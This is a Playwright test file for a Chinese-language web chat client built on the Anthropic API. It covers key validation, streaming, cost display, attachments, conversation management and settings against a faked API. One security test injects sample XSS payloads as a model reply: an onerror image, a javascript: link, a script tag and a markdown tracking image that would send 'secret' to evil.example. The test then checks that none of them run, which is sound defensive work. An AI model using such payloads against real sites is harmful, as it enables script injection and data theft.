import { expect, test, type Page, type Route } from "@playwright/test";
import { sseBody, type FakeReply } from "../helpers/sse.ts";

const KEY = "sk-ant-api03-e2e-test-key-0000000000000000AAAA";

type Responder = (body: Record<string, unknown>) => FakeReply | { status: number; message: string } | "hang";

interface FakeApi {
  requests: Array<Record<string, unknown>>;
  respond: (responder: Responder) => void;
  otherHosts: string[];
}

/** 攔下所有對 Anthropic 的呼叫；其他外部網址一律擋下並記錄 */
async function fakeApi(page: Page, keyValid = true): Promise<FakeApi> {
  const api: FakeApi = { requests: [], respond: () => {}, otherHosts: [] };
  let responder: Responder = () => ({ chunks: ["好的。"] });
  api.respond = (r) => (responder = r);
  await page.route("https://api.anthropic.com/**", async (route: Route) => {
    const request = route.request();
    if (request.method() === "OPTIONS") return route.fulfill({ status: 204, headers: corsHeaders() });
    if (request.url().includes("/v1/models")) {
      return route.fulfill({ status: keyValid ? 200 : 401, headers: corsHeaders(), contentType: "application/json", body: keyValid ? '{"data":[]}' : '{"type":"error","error":{"type":"authentication_error","message":"invalid x-api-key"}}' });
    }
    const body = request.postDataJSON() as Record<string, unknown>;
    api.requests.push(body);
    const reply = responder(body);
    if (reply === "hang") return; // 不回應，模擬回覆很久
    if ("status" in reply) {
      return route.fulfill({ status: reply.status, headers: corsHeaders(), contentType: "application/json", body: JSON.stringify({ type: "error", error: { type: "error", message: reply.message } }) });
    }
    return route.fulfill({ status: 200, headers: corsHeaders(), contentType: "text/event-stream", body: sseBody(reply) });
  });
  await page.route(/^https?:\/\/(?!api\.anthropic\.com|127\.0\.0\.1|localhost)/, (route) => {
    api.otherHosts.push(route.request().url());
    return route.abort();
  });
  return api;
}

function corsHeaders() {
  return { "access-control-allow-origin": "*", "access-control-allow-headers": "*", "access-control-allow-methods": "*" };
}

async function setupKey(page: Page) {
  await page.goto("/");
  await page.locator("#api-key-input").fill(KEY);
  await page.getByRole("button", { name: "驗證並儲存" }).click();
  await expect(page.getByRole("button", { name: "＋ 新對話" })).toBeVisible();
}

async function send(page: Page, text: string) {
  await page.locator("#composer-input").fill(text);
  await page.locator("#composer-input").press("Enter");
}

test("第一次打開：金鑰無效會說明原因，不會存", async ({ page }) => {
  await fakeApi(page, false);
  await page.goto("/");
  await page.locator("#api-key-input").fill("sk-ant 有空白");
  await page.getByRole("button", { name: "驗證並儲存" }).click();
  await expect(page.getByRole("alert")).toContainText("空白或特殊字元");
  await page.locator("#api-key-input").fill(KEY);
  await page.getByRole("button", { name: "驗證並儲存" }).click();
  await expect(page.getByRole("alert")).toContainText("金鑰無效");
  await page.reload();
  await expect(page.locator("#api-key-input")).toBeVisible();
});

test("對話：回覆逐字顯示、顯示費用，重新整理後對話還在", async ({ page }) => {
  const api = await fakeApi(page);
  api.respond(() => ({ chunks: ["以下是**待辦**：\n\n", "1. 小林寄報價單\n", "2. 阿美確認場地"], usage: { input_tokens: 2310, output_tokens: 412 } }));
  await setupKey(page);
  await send(page, "幫我整理會議紀錄\n第二行");

  const reply = page.getByTestId("assistant-message");
  await expect(reply.locator("strong")).toHaveText("待辦");
  await expect(reply.locator("ol li")).toHaveCount(2);
  // Sonnet 5.5：2310×2 + 412×10 = 8740 / 1e6
  await expect(reply.getByTestId("reply-cost")).toHaveText("US$0.009");
  await expect(reply).toContainText("輸入 2,310／輸出 412 tokens");
  await expect(page.getByTestId("month-cost")).toContainText("US$0.009");
  await expect(page.getByRole("heading", { level: 1 })).toHaveText("幫我整理會議紀錄");

  const body = api.requests[0]!;
  expect(body.model).toBe("claude-sonnet-5-5");
  expect(body.stream).toBe(true);
  expect(body.output_config).toEqual({ effort: "medium" });
  expect(body.messages).toEqual([{ role: "user", content: [{ type: "text", text: "幫我整理會議紀錄\n第二行" }] }]);

  await page.reload();
  await page.getByRole("button", { name: "幫我整理會議紀錄" }).click();
  await expect(page.getByTestId("assistant-message")).toContainText("阿美確認場地");
  await expect(page.getByTestId("month-cost")).toContainText("US$0.009");

  // 第二輪：帶上前面的對話
  api.respond(() => ({ chunks: ["收到"] }));
  await send(page, "謝謝");
  await expect(page.getByTestId("assistant-message")).toHaveCount(2);
  const second = api.requests[1]!.messages as Array<{ role: string }>;
  expect(second.map((m) => m.role)).toEqual(["user", "assistant", "user"]);
});

test("Shift+Enter 換行不送出", async ({ page }) => {
  const api = await fakeApi(page);
  await setupKey(page);
  await page.locator("#composer-input").fill("第一行");
  await page.locator("#composer-input").press("Shift+Enter");
  await page.locator("#composer-input").pressSequentially("第二行");
  await expect(page.locator("#composer-input")).toHaveValue("第一行\n第二行");
  expect(api.requests).toHaveLength(0);
});

test("停止：回覆中按停止，不會卡住，費用記為無法計算", async ({ page }) => {
  const api = await fakeApi(page);
  api.respond(() => "hang");
  await setupKey(page);
  await send(page, "寫一篇長文");
  await expect(page.getByTestId("streaming-message")).toContainText("思考中");
  await page.getByRole("button", { name: "停止" }).click();
  await expect(page.getByRole("button", { name: "送出" })).toBeVisible();
  await expect(page.getByTestId("streaming-message")).toHaveCount(0);
  await expect(page.getByTestId("month-cost")).toContainText("另有 1 次無法計算");
});

test("錯誤：金鑰被撤銷時顯示白話說明，可以重試", async ({ page }) => {
  const api = await fakeApi(page);
  await setupKey(page);
  api.respond(() => ({ status: 401, message: "invalid x-api-key" }));
  await send(page, "嗨");
  await expect(page.getByRole("alert")).toContainText("API 金鑰無效或已被刪除");
  api.respond(() => ({ chunks: ["哈囉"] }));
  await page.getByRole("button", { name: "重試" }).click();
  await expect(page.getByTestId("assistant-message")).toContainText("哈囉");
  await expect(page.getByRole("alert")).toHaveCount(0);
  expect(api.requests.at(-1)!.messages).toHaveLength(1);
});

test("重新產生：取代最後一則回覆", async ({ page }) => {
  const api = await fakeApi(page);
  api.respond(() => ({ chunks: ["第一版"] }));
  await setupKey(page);
  await send(page, "取個名字");
  await expect(page.getByTestId("assistant-message")).toContainText("第一版");
  api.respond(() => ({ chunks: ["第二版"] }));
  await page.getByRole("button", { name: "重新產生" }).click();
  await expect(page.getByTestId("assistant-message")).toHaveCount(1);
  await expect(page.getByTestId("assistant-message")).toContainText("第二版");
  expect(api.requests[1]!.messages).toHaveLength(1);
});

test("附檔：圖片與文字檔一起送出", async ({ page }) => {
  const api = await fakeApi(page);
  await setupKey(page);
  const png = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==", "base64");
  await page.locator("#file-input").setInputFiles([
    { name: "截圖.png", mimeType: "image/png", buffer: png },
    { name: "notes.txt", mimeType: "text/plain", buffer: Buffer.from("會議內容") },
    { name: "合約.docx", mimeType: "application/vnd.openxmlformats-officedocument.wordprocessingml.document", buffer: Buffer.from("x") },
  ]);
  await expect(page.getByRole("alert")).toContainText("「合約.docx」的格式不支援");
  await expect(page.locator(".composer .chip")).toHaveCount(2);
  await send(page, "看一下");
  await expect(page.getByTestId("assistant-message")).toBeVisible();
  const content = (api.requests[0]!.messages as Array<{ content: Array<Record<string, unknown>> }>)[0]!.content;
  expect(content.map((b) => b.type)).toEqual(["image", "text"]);
  expect(content[0]).toMatchObject({ source: { type: "base64", media_type: "image/png", data: png.toString("base64") } });
  expect(content[1]!.text).toBe('<file name="notes.txt">\n會議內容\n</file>\n\n看一下');
  await expect(page.getByTestId("user-message").locator(".chip")).toHaveCount(2);
});

test("安全：回覆裡的 HTML、外部圖片、javascript 連結都不會執行或載入", async ({ page }) => {
  const api = await fakeApi(page);
  api.respond(() => ({
    chunks: [
      '<img src=x onerror="window.__pwned=1">\n\n',
      "![追蹤](https://evil.example/pixel.png?d=secret)\n\n",
      "[點我](javascript:window.__pwned=2) 和 [官網](https://www.anthropic.com)\n\n",
      "<script>window.__pwned=3</script>",
    ],
  }));
  await setupKey(page);
  await send(page, "測試");
  const reply = page.getByTestId("assistant-message");
  await expect(reply).toContainText("[圖片：追蹤]");
  await expect(reply.locator("img")).toHaveCount(0);
  await expect(reply.locator("script")).toHaveCount(0);
  await expect(reply).toContainText('<img src=x onerror="window.__pwned=1">');
  await expect(reply.locator('a[href^="javascript"]')).toHaveCount(0);
  await expect(reply.getByRole("link", { name: "官網" })).toHaveAttribute("href", "https://www.anthropic.com/");
  expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBeUndefined();
  expect(api.otherHosts).toEqual([]);
});

test("程式碼區塊有高亮與複製按鈕", async ({ page, context }) => {
  await context.grantPermissions(["clipboard-read", "clipboard-write"]);
  const api = await fakeApi(page);
  api.respond(() => ({ chunks: ["```python\nprint('hi')\n```"] }));
  await setupKey(page);
  await send(page, "寫程式");
  const block = page.getByTestId("assistant-message").locator(".code-block");
  await expect(page.getByTestId("streaming-message")).toHaveCount(0);
  await expect(block.locator(".code-head")).toContainText("python");
  await expect(block.locator(".hljs-built_in")).toHaveText("print");
  await block.getByRole("button", { name: "複製" }).click();
  await expect(block.getByRole("button", { name: "已複製" })).toBeVisible();
  expect(await page.evaluate(() => navigator.clipboard.readText())).toBe("print('hi')");
});

test("對話管理：改名、搜尋、匯出 Markdown、刪除", async ({ page }) => {
  const api = await fakeApi(page);
  await setupKey(page);
  api.respond(() => ({ chunks: ["VLOOKUP 的用法是…"] }));
  await send(page, "Excel 公式問題");
  await expect(page.getByTestId("assistant-message")).toBeVisible();
  await page.getByRole("button", { name: "＋ 新對話" }).click();
  api.respond(() => ({ chunks: ["Dear John…"] }));
  await send(page, "英文 email 回覆");
  await expect(page.getByTestId("assistant-message")).toBeVisible();

  await page.locator("#search-input").fill("vlookup");
  await expect(page.locator(".conv-item")).toHaveText(["Excel 公式問題"]);
  await page.locator("#search-input").fill("");

  await page.getByRole("button", { name: "更多動作" }).click();
  await page.getByRole("menuitem", { name: "改名" }).click();
  await page.locator("#rename-input").fill("給 John 的回信");
  await page.locator("#rename-input").press("Enter");
  await expect(page.getByRole("heading", { level: 1 })).toHaveText("給 John 的回信");
  await expect(page.locator(".conv-item.active")).toHaveText("給 John 的回信");

  await page.getByRole("button", { name: "更多動作" }).click();
  const downloadPromise = page.waitForEvent("download");
  await page.getByRole("menuitem", { name: "匯出 Markdown" }).click();
  const download = await downloadPromise;
  expect(download.suggestedFilename()).toBe("給 John 的回信.md");
  const path = await download.path();
  const { readFile } = await import("node:fs/promises");
  const markdown = await readFile(path, "utf8");
  expect(markdown).toContain("# 給 John 的回信");
  expect(markdown).toContain("## Sonnet 5.5\n\nDear John…");

  await page.getByRole("button", { name: "更多動作" }).click();
  await page.getByRole("menuitem", { name: "刪除" }).click();
  await page.getByRole("alertdialog").getByRole("button", { name: "刪除" }).click();
  await expect(page.locator(".conv-item")).toHaveText(["Excel 公式問題"]);
  await expect(page.getByRole("heading", { level: 1 })).toHaveText("新對話");
  // 刪掉對話，本月花費不變
  await expect(page.getByTestId("month-cost")).not.toContainText("US$0.000");
});

test("模型、思考深度、角色範本", async ({ page }) => {
  const api = await fakeApi(page);
  await setupKey(page);

  await page.getByRole("button", { name: "設定" }).click();
  await page.getByRole("tab", { name: "角色範本" }).click();
  await page.getByRole("button", { name: "＋ 新增範本" }).click();
  await page.locator("#template-name").fill("英文編輯");
  await page.locator("#template-prompt").fill("你是專業的英文編輯，說明用繁體中文。");
  await page.getByRole("button", { name: "儲存範本" }).click();
  await expect(page.locator(".template-name")).toHaveText(["英文編輯"]);
  await page.getByRole("button", { name: "回到對話" }).click();

  await page.locator("#model-select").selectOption({ label: "Haiku 4.5" });
  await expect(page.locator("#effort-select")).toBeDisabled();
  await page.locator("#role-select").selectOption({ label: "英文編輯" });
  await send(page, "fix: i has a apple");
  await expect(page.getByTestId("assistant-message")).toBeVisible();
  const body = api.requests[0]!;
  expect(body.model).toBe("claude-haiku-4-5");
  expect(body.system).toBe("你是專業的英文編輯，說明用繁體中文。");
  expect(body.output_config).toBeUndefined();
  expect(body.thinking).toBeUndefined();

  // 新對話沿用上次選的模型
  await page.getByRole("button", { name: "＋ 新對話" }).click();
  await expect(page.locator("#model-select")).toHaveValue("claude-haiku-4-5");

  // 自訂角色只套用在這段對話
  await page.locator("#model-select").selectOption({ label: "Opus 5.5" });
  await page.locator("#effort-select").selectOption({ label: "高" });
  await page.locator("#role-select").selectOption({ label: "自訂…" });
  await page.locator("#system-input").fill("用條列回答");
  await page.getByRole("button", { name: "套用" }).click();
  await send(page, "優缺點");
  await expect(page.getByTestId("assistant-message")).toBeVisible();
  expect(api.requests[1]).toMatchObject({ model: "claude-opus-5-5", system: "用條列回答", output_config: { effort: "high" } });
});

test("設定：用量頁、更換與刪除金鑰、深色模式", async ({ page }) => {
  const api = await fakeApi(page);
  api.respond(() => ({ chunks: ["ok"], model: "claude-sonnet-5-5", usage: { input_tokens: 100_000, output_tokens: 10_000 } }));
  await setupKey(page);
  await send(page, "嗨");
  await expect(page.getByTestId("assistant-message")).toBeVisible();

  await page.getByRole("button", { name: "設定" }).click();
  await expect(page.getByTestId("masked-key")).toHaveText("sk-ant-api…AAAA");
  await page.getByRole("tab", { name: "用量" }).click();
  await expect(page.getByTestId("usage-total")).toHaveText("US$0.300");

  await page.getByRole("tab", { name: "外觀" }).click();
  await page.getByLabel("深色").check();
  await expect(page.locator("html")).toHaveAttribute("data-theme", "dark");

  await page.getByRole("tab", { name: "API 金鑰" }).click();
  await page.getByRole("button", { name: "刪除", exact: true }).click();
  await page.getByRole("button", { name: "刪除金鑰" }).click();
  await expect(page.locator("#api-key-input")).toBeVisible();
  await page.reload();
  await expect(page.locator("#api-key-input")).toBeVisible();
  await expect(page.locator("html")).toHaveAttribute("data-theme", "dark");
});
